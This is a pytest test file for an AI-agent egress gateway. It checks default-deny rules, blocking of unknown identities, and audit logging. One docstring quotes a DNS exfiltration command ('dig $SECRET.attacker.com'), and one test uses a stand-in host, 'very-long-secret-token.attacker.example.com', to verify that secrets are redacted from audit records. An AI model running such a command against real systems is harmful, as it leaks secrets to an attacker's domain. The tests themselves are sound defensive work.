"""Tests for the gateway-local Safety pipeline.

The decision invariant under test: no rule matches → block. Any rule
matches → allow. These tests also verify that unknown identity =
block and audit publishing never stalls the decision path.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Any

import pytest

from rolemesh.egress.policy_cache import PolicyCache
from rolemesh.egress.safety_call import (
    AuditPublisher,
    EgressRequest,
    EgressSafetyCaller,
)
from rolemesh.egress.token_identity import Identity

pytestmark = pytest.mark.asyncio


@dataclass
class _FakeNats:
    """Captures publish calls without hitting real NATS."""

    published: list[tuple[str, dict[str, Any]]]

    async def publish(self, subject: str, data: bytes) -> None:
        import json

        self.published.append((subject, json.loads(data)))


def _identity() -> Identity:
    return Identity(
        tenant_id="tenant-a",
        coworker_id="coworker-x",
        user_id="user-1",
        conversation_id="conv-1",
        job_id="job-1",
        container_name="rolemesh-foo-1",
    )


async def _make_caller(
    *,
    rules: list[dict[str, Any]],
    checks: dict[str, Any],
    nc: _FakeNats,
) -> EgressSafetyCaller:
    cache = PolicyCache()
    await cache.seed(rules)
    audit = AuditPublisher(nats_client=nc)  # type: ignore[arg-type]
    return EgressSafetyCaller(cache=cache, checks=checks, audit_publisher=audit)


async def test_no_rules_blocks_by_default() -> None:
    """Default-deny is the whole point of the egress pipeline."""
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=[], checks={}, nc=nc)
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "block"


async def test_matching_rule_allows() -> None:
    """At least one rule matched → allow, even if other rules are silent."""
    async def _always_match(
        request: EgressRequest, config: dict[str, Any]
    ) -> tuple[bool, list[dict[str, Any]]]:
        return True, []

    rules = [
        {
            "id": "r1",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.domain_rule",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    ]
    nc = _FakeNats(published=[])
    caller = await _make_caller(
        rules=rules, checks={"egress.domain_rule": _always_match}, nc=nc
    )
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "allow"
    assert decision.triggered_rule_ids == ["r1"]


async def test_unseeded_cache_blocks_even_with_matching_rule() -> None:
    """Degraded startup: before the authoritative snapshot is seeded the
    pipeline must deny deterministically — including when a rule-change
    event already inserted a rule whose check would match. Relying on
    the empty-cache accident is not acceptable (an unseeded cache is
    not the same state as a tenant with zero rules)."""
    async def _always_match(
        request: EgressRequest, config: dict[str, Any]
    ) -> tuple[bool, list[dict[str, Any]]]:
        return True, []

    nc = _FakeNats(published=[])
    cache = PolicyCache()  # never seeded
    await cache.apply_event(
        {
            "action": "created",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.domain_rule",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    )
    caller = EgressSafetyCaller(
        cache=cache,
        checks={"egress.domain_rule": _always_match},
        audit_publisher=AuditPublisher(nats_client=nc),  # type: ignore[arg-type]
    )
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "block"
    assert "not yet loaded" in decision.reason


async def test_unseeded_block_is_still_audited() -> None:
    """Every decision writes an audit row — the degraded-window denials
    must be visible to operators, not silent."""
    nc = _FakeNats(published=[])
    caller = EgressSafetyCaller(
        cache=PolicyCache(),  # never seeded
        checks={},
        audit_publisher=AuditPublisher(nats_client=nc),  # type: ignore[arg-type]
    )
    await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    for _ in range(50):
        await asyncio.sleep(0.02)
        if nc.published:
            break
    assert nc.published, "degraded-window block was not audited"
    _, payload = nc.published[-1]
    assert payload["verdict_action"] == "block"


async def test_unknown_identity_always_blocks() -> None:
    """Unknown source IP must never default to any tenant."""
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=[], checks={}, nc=nc)
    decision = await caller.decide(
        identity=None,
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "block"
    assert "Unknown source identity" in decision.reason


async def test_check_exception_does_not_crash_decide() -> None:
    """A buggy check must not kill the gateway hot path."""
    async def _crashes(
        request: EgressRequest, config: dict[str, Any]
    ) -> tuple[bool, list[dict[str, Any]]]:
        raise RuntimeError("boom")

    rules = [
        {
            "id": "r1",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.domain_rule",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    ]
    nc = _FakeNats(published=[])
    caller = await _make_caller(
        rules=rules, checks={"egress.domain_rule": _crashes}, nc=nc
    )
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "block"  # crashed check = no match = block


async def test_dns_audit_redacts_sensitive_qname() -> None:
    """An exfil-shaped DNS query must not land verbatim in the audit
    ``context_summary``. Attacker: ``dig $SECRET.attacker.com`` would
    otherwise save SECRET into safety_decisions where any row-level
    DB read recovers it.

    The redactor keeps just the last two labels so the audit trail
    still says "attacker.com family"; the SHA-256 digest stays intact
    for dedup of repeated attempts.
    """
    rules = [
        {
            "id": "r1",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.domain_rule",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    ]
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=rules, checks={}, nc=nc)
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(
            host="very-long-secret-token.attacker.example.com",
            port=0,
            mode="dns",
            qtype="A",
        ),
    )
    assert decision.action == "block"

    # Drain pending audit tasks. publish is fire-and-forget; poll briefly.
    for _ in range(50):
        await asyncio.sleep(0.02)
        if nc.published:
            break
    assert nc.published, "audit event never published"
    _, payload = nc.published[-1]
    summary = payload["context_summary"]

    # The secret label must NOT appear in the audit summary.
    assert "very-long-secret-token" not in summary, (
        f"Secret label leaked into audit: {summary!r}"
    )
    # We keep the two rightmost labels so the row is still operationally
    # useful, and a redaction marker ``***.`` to make the redaction
    # visible.
    assert "example.com" in summary
    assert "***" in summary
    # Digest is the untouched SHA of the real payload — dedup intact.
    assert payload["context_digest"], "context_digest must be present"


async def test_dns_audit_short_qname_passes_through() -> None:
    """No redaction needed when the name has ≤ 2 labels — nothing to
    strip without losing information."""
    rules = [
        {
            "id": "r1",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.domain_rule",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    ]
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=rules, checks={}, nc=nc)
    await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="example.com", port=0, mode="dns", qtype="A"),
    )
    for _ in range(50):
        await asyncio.sleep(0.02)
        if nc.published:
            break
    _, payload = nc.published[-1]
    summary = payload["context_summary"]
    assert "example.com" in summary
    # No redaction marker on a 2-label name — nothing to redact.
    assert "***" not in summary


async def test_forward_mode_audit_does_not_redact() -> None:
    """Host/port audit for forward mode must NOT redact — the gateway's
    CONNECT decision is on a real hostname the agent explicitly
    requested, not user-controlled unbounded labels. Operators need
    the full host to investigate allow/deny patterns."""
    rules: list[dict[str, Any]] = []
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=rules, checks={}, nc=nc)
    await caller.decide(
        identity=_identity(),
        request=EgressRequest(
            host="api.anthropic.com",
            port=443,
            mode="forward",
            method="CONNECT",
        ),
    )
    for _ in range(50):
        await asyncio.sleep(0.02)
        if nc.published:
            break
    _, payload = nc.published[-1]
    # Forward mode keeps the full host — no marker.
    assert payload["context_summary"].startswith("forward:api.anthropic.com:")
    assert "***" not in payload["context_summary"]


async def test_unknown_check_id_is_skipped() -> None:
    """A rule referencing a check_id we don't have is a config error —
    skip it rather than treating it as a hit (which would silently
    grant egress)."""
    rules = [
        {
            "id": "r1",
            "rule_id": "r1",
            "tenant_id": "tenant-a",
            "coworker_id": "coworker-x",
            "stage": "egress_request",
            "check_id": "egress.does_not_exist",
            "config": {},
            "priority": 100,
            "enabled": True,
        }
    ]
    nc = _FakeNats(published=[])
    caller = await _make_caller(rules=rules, checks={}, nc=nc)
    decision = await caller.decide(
        identity=_identity(),
        request=EgressRequest(host="api.anthropic.com", port=443, mode="forward"),
    )
    assert decision.action == "block"
